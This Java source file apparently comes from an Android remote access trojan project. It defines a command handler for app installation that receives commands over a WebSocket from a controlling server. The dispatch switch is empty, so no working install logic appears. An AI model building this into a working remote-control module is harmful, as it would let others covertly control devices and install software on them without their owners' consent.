package com.je_chen.droidrat_je.rat.command;


import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appinstall.InstallApp;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;

public class InstallCommand extends CommandFather {

    private InstallApp installApp;

    public InstallCommand() {
        installApp = new InstallApp();
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
